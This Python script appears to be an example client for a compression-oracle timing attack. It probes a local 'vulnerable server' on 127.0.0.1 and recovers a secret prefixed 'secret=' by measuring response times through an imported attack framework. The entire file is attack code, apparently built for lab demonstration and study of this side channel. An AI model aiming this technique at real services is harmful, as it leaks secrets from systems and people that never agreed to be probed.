import socket
import string
import time
from common import send_blob, recv_blob

from compression_oracle import CompressionOracle, TwoTriesBlockCipherGuess

HOST = '127.0.0.1'    # The remote host
PORT = 30001          # The same port as used by the server

class CustomGuessProvider(TwoTriesBlockCipherGuess):

  def range(self):
    """ This "range" was determined after observing return
    values from the vulnerable server. """
    return range(220,300)

class Client(CompressionOracle):

  def __init__(self, seed):
    CompressionOracle.__init__(self, seed=seed,
      alphabet=string.printable, max_threads=1,
      lookaheads=0, retries=10, guess_provider=CustomGuessProvider)
    return

  def prepare_complement(self):
    return '\x00\xFF'*500

  def oracle(self, data):
    """ send 'data' to the oracle and calculate the time it takes to get a response. """

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))

    t = time.time()
    send_blob(s, data)
    data = recv_blob(s)
    t = (time.time() - t)

    s.close()

    #print repr(t * 1000)

    # The pivot value "600" was manually determined after observing
    # the behavior of the vulnerable server.
    return int((t * 1000) / 600)

  def cleanup(self):
    return

c = Client(seed='secret=')
c.run()
